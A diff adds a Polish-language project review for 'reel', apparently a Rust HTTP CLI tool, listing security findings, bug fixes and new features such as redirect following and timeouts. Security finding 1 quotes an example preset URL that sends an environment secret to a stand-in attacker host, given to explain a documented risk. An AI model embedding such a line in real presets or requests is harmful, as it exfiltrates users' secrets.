@@ -1,3 +1,81 @@
+# Przegląd projektu — 2026-07-17
+
+Drugi przegląd (po dodaniu zmiennych sesyjnych i `| default:`), pod tym samym kątem:
+architektura, bezpieczeństwo, SOLID/stairway, funkcjonalność z poziomu użytkownika.
+Poprawki z przeglądu 2026-07-11 zweryfikowane w kodzie — wszystkie obecne.
+
+## Ocena ogólna
+
+Bez zmian strukturalnych: warstwy `cli → http/template/session → model` bez cykli,
+DIP przez traity, parser i model czyste (zero I/O), clippy/fmt bez uwag.
+
+## Bezpieczeństwo
+
+### 1. Presety z `${{ env.* }}` mogą eksfiltrować sekrety — model zaufania
+Preset z niezaufanego źródła może zawierać `url: "https://attacker/?x=${{ env.SECRET }}"`;
+`then` wykona takie żądanie. Cecha nieodłączna funkcji (preset = skrypt), ale wymagała
+jawnego ostrzeżenia.
+**Status: udokumentowane.** README: sekcja `then` dostała ramkę "Treat preset files like
+scripts" ze wskazaniem `--dry-run` jako inspekcji.
+
+### 2. Pełne ciała odpowiedzi w pliku sesji
+Duże odpowiedzi rosną kosztem każdego zapisu sesji. **Status: świadomie pominięte**
+(pliki `0600`; ewentualny limit rozmiaru do rozważenia osobno).
+
+## Błędy
+
+### 3. `--retry 0` z `--until` dawało budżet 10 prób — `runner.rs`
+Jawne `--retry 0` było nieodróżnialne od wartości domyślnej (`retry: u32 = 0`).
+**Status: naprawione.** `retry: Option<u32>` — `--retry 0` ogranicza poll do jednej próby.
+
+### 4. Literał z `}}` rozbijał interpolację — `template/mod.rs`
+`${{ base64('}}') }}` kończyło się błędem: `interpolate` szukało pierwszego `}}` bez
+świadomości cudzysłowów. **Status: naprawione** (`placeholder_end` pomija `}}` w cudzysłowach).
+
+### 5. `header-rm` zniekształcał komunikat ostrzeżenia — `parser.rs`
+Parser robił `to_lowercase()`, więc warning pokazywał inną pisownię niż wpisana.
+**Status: naprawione** (usuwanie i tak jest case-insensitive w `Headers::remove`).
+
+### 6. Nazwana sesja czytana, ale niemodyfikowana, znikała po 7 dniach — `session/mod.rs`
+Reguła wieku opierała się na mtime, którego odczyt nie odświeżał. **Status: naprawione.**
+`load` odświeża mtime (best-effort) — "7 days without use" z README jest teraz prawdą.
+
+### 7. Niespójna pisownia flag — `parser.rs`
+`fail` bez `--fail`; `--retry`/`--until`/`--delay` bez form gołych. **Status: naprawione.**
+Każda flaga przyjmuje obie formy; token zjedzony jako wartość nadal nigdy nie jest flagą.
+
+### 8. `method` wymuszał uppercase — `parser.rs`
+Metody HTTP są case-sensitive (RFC 9110); niestandardowej metody nie dało się wysłać
+w oryginalnej pisowni. **Status: naprawione** (`normalize_method` — uppercase tylko dla
+metod standardowych).
+
+## Funkcjonalność
+
+### 9. Brak `body-rm`
+Body dało się wyczyścić tylko `reset`em albo `load`em. **Status: dodane.**
+
+### 10. Brak podążania za redirectami
+curl ma `-L`; w reel łańcuch 302 trzeba było przechodzić ręcznie. **Status: dodane.**
+`--follow`/`follow` — pętla hopów w `execute_following` (`cli/runner.rs`), nie w reqwest,
+żeby jar widział każdy hop; 303 (i 301/302 po POST) → GET bez body; cross-host zdejmuje
+`Authorization`/`Cookie`; limit 10 hopów (przekroczenie = `PermanentError`); do historii
+trafia tylko finalna para; `curl` emituje `-L`.
+
+### 11. Sztywny timeout 30 s
+**Status: dodane.** `timeout <SECONDS>` jako pole `Request` (per żądanie, w sesji
+i presetach); `0` wyłącza timeout (klient budowany bez timeoutu globalnego); `curl`
+emituje `-m`.
+
+### 12. Brak `cookie-rm`
+Jar dało się wyczyścić tylko `reset`em. **Status: dodane** (`cookie-rm <NAME>` usuwa
+wszystkie ciasteczka o danej nazwie).
+
+### 13. Powtórzone nagłówki niemożliwe (mapa z deduplikacją)
+**Status: udokumentowane w README jako ograniczenie** (rzadka potrzeba; zmiana modelu
+`Headers` nieopłacalna).
+
+---
+
 # Przegląd projektu — 2026-07-11
 
 Przegląd całego kodu pod kątem architektury, bezpieczeństwa, SOLID i wzorca stairway.
